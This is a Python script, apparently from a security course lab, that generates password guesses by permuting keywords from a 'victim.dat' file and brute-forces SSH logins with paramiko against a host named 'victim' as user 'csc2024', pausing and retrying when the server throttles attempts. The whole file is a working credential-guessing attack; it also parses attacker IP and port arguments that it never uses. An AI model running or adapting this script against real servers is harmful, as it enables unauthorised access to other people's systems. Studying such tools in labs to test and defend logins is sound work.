#!/usr/bin/python3

import itertools
import paramiko
import logging
import socket
import time
import sys

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

def generate_combinations(ifname: str = "victim.dat", ofname: str = "combination.txt") -> int:
    # read from file
    try:
        with open(ifname, "r") as ifd:
            keywords = [line.strip() for line in ifd]
    except FileNotFoundError as e:
        print(e)
        return 1

    # generate combination from itertools
    # write result to a file
    ofd = open(ofname, "a")
    combination_list = []
    for length in range(1, len(keywords) + 1):
        combination_list = ["".join(list(b)) for b in list(itertools.permutations(keywords, length))]
        for combo in combination_list:
            ofd.write(combo + "\n")
    ofd.close()
    return 0

def connect_ssh(hostname: str = "victim", username: str = "csc2024", password: str = "", depth: int = 0) -> int:
    if password == "":
        print("[!] Password is required")
        return 1
    prefix = ""
    if depth > 0:
        prefix = "\n"
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(hostname=hostname, username=username, password=password, timeout=1)
    except socket.timeout:
        print(f"{prefix}[!] Host: {hostname} is unreachable, timed out.")
        return 2
    except paramiko.AuthenticationException:
        print(f"{prefix}[!] Invalid credentials for {username}:{password}")
        return 3
    except (paramiko.SSHException, EOFError, paramiko.ssh_exception.SSHException):
        if depth == 0:
            print(f"[*] Quota exceeded, retrying with delay", end="")
        else:
            print(".", end="")
        # sleep for a minute
        sys.stdout.flush()
        time.sleep(5)
        return connect_ssh(hostname, username, password, depth+1)
    else:
        # connection was established successfully
        print(f"{prefix}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
    return 0

def crack_ssh(target_hostname: str = "victim", ifname: str = "combination.txt") -> int:
    # read combinations from file
    # crack ssh using the string in the file
    username = "csc2024"
    ret = 0
    with open(ifname, "r") as fd:
        for line in fd:
            ret = connect_ssh(hostname=target_hostname, username=username, password=line.strip())
            if ret == 0:
                break
    return 0

def parse_arguments() -> tuple:
    if len(sys.argv) < 3:
        print("Usage: {} <Victim IP> <Attacker IP> <Attacker port>".format(sys.argv[0]))
        exit(1)
    try:
        attacker_port = int(sys.argv[3])
    except ValueError as e:
        print("Invalid port number")
        exit(1)
    return (sys.argv[1], sys.argv[2], attacker_port)

def main():
    victim_ip, attack_ip, attacker_port = parse_arguments()
    generate_combinations()
    crack_ssh(target_hostname=victim_ip)

if __name__ == "__main__":
    main()
